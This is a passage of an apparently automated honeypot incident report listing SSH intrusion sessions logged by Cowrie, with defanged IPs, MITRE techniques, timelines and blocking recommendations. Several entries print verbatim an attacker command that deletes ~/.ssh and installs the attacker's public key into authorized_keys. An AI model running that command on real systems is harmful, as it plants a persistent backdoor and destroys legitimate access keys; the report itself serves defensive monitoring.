| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:40:36` | `cowrie.session.connect` |
| `2026-04-19 06:40:36` | `cowrie.client.version` |
| `2026-04-19 06:40:36` | `cowrie.client.kex` |
| `2026-04-19 06:40:36` | `cowrie.login.success` |
| `2026-04-19 06:40:37` | `cowrie.session.params` |
| `2026-04-19 06:40:37` | `cowrie.command.input` |
| `2026-04-19 06:40:37` | `cowrie.command.failed` |
| `2026-04-19 06:40:37` | `cowrie.log.closed` |
| `2026-04-19 06:40:37` | `cowrie.session.params` |
| `2026-04-19 06:40:37` | `cowrie.command.input` |
| `2026-04-19 06:40:37` | `cowrie.session.file_download` |
| `2026-04-19 06:40:37` | `cowrie.log.closed` |
| `2026-04-19 06:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32b5b858b34a

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:40 |
| **Last Seen** | 2026-04-19 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:40:37` | `cowrie.session.connect` |
| `2026-04-19 06:40:37` | `cowrie.client.version` |
| `2026-04-19 06:40:37` | `cowrie.client.kex` |
| `2026-04-19 06:40:38` | `cowrie.login.success` |
| `2026-04-19 06:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c1d527fb84

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-19 06:40 |
| **Last Seen** | 2026-04-19 06:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:40:39` | `cowrie.session.connect` |
| `2026-04-19 06:40:39` | `cowrie.client.version` |
| `2026-04-19 06:40:39` | `cowrie.client.kex` |
| `2026-04-19 06:40:40` | `cowrie.login.success` |
| `2026-04-19 06:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-403db69e82e4

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:41 |
| **Last Seen** | 2026-04-19 06:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:41:04` | `cowrie.session.connect` |
| `2026-04-19 06:41:04` | `cowrie.client.version` |
| `2026-04-19 06:41:04` | `cowrie.client.kex` |
| `2026-04-19 06:41:05` | `cowrie.login.success` |
| `2026-04-19 06:41:05` | `cowrie.session.params` |
| `2026-04-19 06:41:05` | `cowrie.command.input` |
| `2026-04-19 06:41:05` | `cowrie.command.failed` |
| `2026-04-19 06:41:05` | `cowrie.log.closed` |
| `2026-04-19 06:41:06` | `cowrie.session.params` |
| `2026-04-19 06:41:06` | `cowrie.command.input` |
| `2026-04-19 06:41:06` | `cowrie.session.file_download` |
| `2026-04-19 06:41:06` | `cowrie.log.closed` |
| `2026-04-19 06:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c0f4a04602

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:41 |
| **Last Seen** | 2026-04-19 06:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:41:08` | `cowrie.session.connect` |
| `2026-04-19 06:41:08` | `cowrie.client.version` |
| `2026-04-19 06:41:08` | `cowrie.client.kex` |
| `2026-04-19 06:41:09` | `cowrie.login.success` |
| `2026-04-19 06:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.123.245[.]198` to AbuseIPDB if not already reported
- [ ] Block `193.123.245[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eb352d0aaa1

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:41 |
| **Last Seen** | 2026-04-19 06:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:41:17` | `cowrie.session.connect` |
| `2026-04-19 06:41:17` | `cowrie.client.version` |
| `2026-04-19 06:41:18` | `cowrie.client.kex` |
| `2026-04-19 06:41:19` | `cowrie.login.success` |
| `2026-04-19 06:41:19` | `cowrie.session.params` |
| `2026-04-19 06:41:19` | `cowrie.command.input` |
| `2026-04-19 06:41:19` | `cowrie.command.failed` |
| `2026-04-19 06:41:19` | `cowrie.log.closed` |
| `2026-04-19 06:41:20` | `cowrie.session.params` |
| `2026-04-19 06:41:20` | `cowrie.command.input` |
| `2026-04-19 06:41:20` | `cowrie.session.file_download` |
| `2026-04-19 06:41:20` | `cowrie.log.closed` |
| `2026-04-19 06:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1518e3e6ce

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:41 |
| **Last Seen** | 2026-04-19 06:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:41:23` | `cowrie.session.connect` |
| `2026-04-19 06:41:23` | `cowrie.client.version` |
| `2026-04-19 06:41:23` | `cowrie.client.kex` |
| `2026-04-19 06:41:24` | `cowrie.login.success` |
| `2026-04-19 06:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cbfba7ba1e5

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:41 |
| **Last Seen** | 2026-04-19 06:46 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:41:47` | `cowrie.session.connect` |
| `2026-04-19 06:41:47` | `cowrie.client.version` |
| `2026-04-19 06:41:47` | `cowrie.client.kex` |
| `2026-04-19 06:41:48` | `cowrie.login.success` |
| `2026-04-19 06:41:49` | `cowrie.session.params` |
| `2026-04-19 06:41:49` | `cowrie.command.input` |
| `2026-04-19 06:41:49` | `cowrie.command.failed` |
| `2026-04-19 06:41:49` | `cowrie.log.closed` |
| `2026-04-19 06:41:50` | `cowrie.session.params` |
| `2026-04-19 06:41:50` | `cowrie.command.input` |
| `2026-04-19 06:41:50` | `cowrie.session.file_download` |
| `2026-04-19 06:41:50` | `cowrie.log.closed` |
| `2026-04-19 06:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-847381cc2dd1

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:41 |
| **Last Seen** | 2026-04-19 06:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:41:54` | `cowrie.session.connect` |
| `2026-04-19 06:41:54` | `cowrie.client.version` |
| `2026-04-19 06:41:54` | `cowrie.client.kex` |
| `2026-04-19 06:41:56` | `cowrie.login.success` |
| `2026-04-19 06:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb701728e8a

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:42 |
| **Last Seen** | 2026-04-19 06:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:42:18` | `cowrie.session.connect` |
| `2026-04-19 06:42:18` | `cowrie.client.version` |
| `2026-04-19 06:42:18` | `cowrie.client.kex` |
| `2026-04-19 06:42:18` | `cowrie.login.success` |
| `2026-04-19 06:42:19` | `cowrie.session.params` |
| `2026-04-19 06:42:19` | `cowrie.command.input` |
| `2026-04-19 06:42:19` | `cowrie.command.failed` |
| `2026-04-19 06:42:19` | `cowrie.log.closed` |
| `2026-04-19 06:42:19` | `cowrie.session.params` |
| `2026-04-19 06:42:19` | `cowrie.command.input` |
| `2026-04-19 06:42:19` | `cowrie.session.file_download` |
| `2026-04-19 06:42:19` | `cowrie.log.closed` |
| `2026-04-19 06:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d734a2e4cd9a

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-04-19 06:42 |
| **Last Seen** | 2026-04-19 06:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:42:21` | `cowrie.session.connect` |
| `2026-04-19 06:42:21` | `cowrie.client.version` |
| `2026-04-19 06:42:21` | `cowrie.client.kex` |
| `2026-04-19 06:42:22` | `cowrie.login.success` |
| `2026-04-19 06:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c2c2b6d1f6e

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:43 |
| **Last Seen** | 2026-04-19 06:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:43:11` | `cowrie.session.connect` |
| `2026-04-19 06:43:11` | `cowrie.client.version` |
| `2026-04-19 06:43:11` | `cowrie.client.kex` |
| `2026-04-19 06:43:12` | `cowrie.login.success` |
| `2026-04-19 06:43:13` | `cowrie.session.params` |
| `2026-04-19 06:43:13` | `cowrie.command.input` |
| `2026-04-19 06:43:13` | `cowrie.command.failed` |
| `2026-04-19 06:43:13` | `cowrie.log.closed` |
| `2026-04-19 06:43:14` | `cowrie.session.params` |
| `2026-04-19 06:43:14` | `cowrie.command.input` |
| `2026-04-19 06:43:14` | `cowrie.session.file_download` |
| `2026-04-19 06:43:14` | `cowrie.log.closed` |
| `2026-04-19 06:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34cb405001bb

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 06:43 |
| **Last Seen** | 2026-04-19 06:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:43:17` | `cowrie.session.connect` |
| `2026-04-19 06:43:17` | `cowrie.client.version` |
| `2026-04-19 06:43:17` | `cowrie.client.kex` |
| `2026-04-19 06:43:18` | `cowrie.login.success` |
| `2026-04-19 06:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcbb01111a3c

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:43 |
| **Last Seen** | 2026-04-19 06:48 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:43:17` | `cowrie.session.connect` |
| `2026-04-19 06:43:17` | `cowrie.client.version` |
| `2026-04-19 06:43:18` | `cowrie.client.kex` |
| `2026-04-19 06:43:19` | `cowrie.login.success` |
| `2026-04-19 06:43:20` | `cowrie.session.params` |
| `2026-04-19 06:43:20` | `cowrie.command.input` |
| `2026-04-19 06:43:20` | `cowrie.command.failed` |
| `2026-04-19 06:43:20` | `cowrie.log.closed` |
| `2026-04-19 06:43:21` | `cowrie.session.params` |
| `2026-04-19 06:43:21` | `cowrie.command.input` |
| `2026-04-19 06:43:21` | `cowrie.session.file_download` |
| `2026-04-19 06:43:21` | `cowrie.log.closed` |
| `2026-04-19 06:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74986995bf8

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:43 |
| **Last Seen** | 2026-04-19 06:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:43:25` | `cowrie.session.connect` |
| `2026-04-19 06:43:25` | `cowrie.client.version` |
| `2026-04-19 06:43:25` | `cowrie.client.kex` |
| `2026-04-19 06:43:27` | `cowrie.login.success` |
| `2026-04-19 06:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e569f13083b3

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:44 |
| **Last Seen** | 2026-04-19 06:49 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:44:01` | `cowrie.session.connect` |
| `2026-04-19 06:44:01` | `cowrie.client.version` |
| `2026-04-19 06:44:01` | `cowrie.client.kex` |
| `2026-04-19 06:44:03` | `cowrie.login.success` |
| `2026-04-19 06:44:03` | `cowrie.session.params` |
| `2026-04-19 06:44:03` | `cowrie.command.input` |
| `2026-04-19 06:44:03` | `cowrie.command.failed` |
| `2026-04-19 06:44:04` | `cowrie.log.closed` |
| `2026-04-19 06:44:04` | `cowrie.session.params` |
| `2026-04-19 06:44:04` | `cowrie.command.input` |
| `2026-04-19 06:44:05` | `cowrie.session.file_download` |
| `2026-04-19 06:44:05` | `cowrie.log.closed` |
| `2026-04-19 06:49:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15124e0bc3a4

| Field | Detail |
|---|---|
| **Source IP** | `138.84.41[.]136` |
| **First Seen** | 2026-04-19 06:44 |
| **Last Seen** | 2026-04-19 06:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 06:44:08` | `cowrie.session.connect` |
| `2026-04-19 06:44:08` | `cowrie.client.version` |
| `2026-04-19 06:44:09` | `cowrie.client.kex` |
| `2026-04-19 06:44:10` | `cowrie.login.success` |
| `2026-04-19 06:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.84.41[.]136` to AbuseIPDB if not already reported
- [ ] Block `138.84.41[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b974446cdfc7

| Field | Detail |
|---|---|
| **Source IP** | `193.123.245[.]198` |
| **First Seen** | 2026-04-19 06:46 |
| **Last Seen** | 2026-04-19 06:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
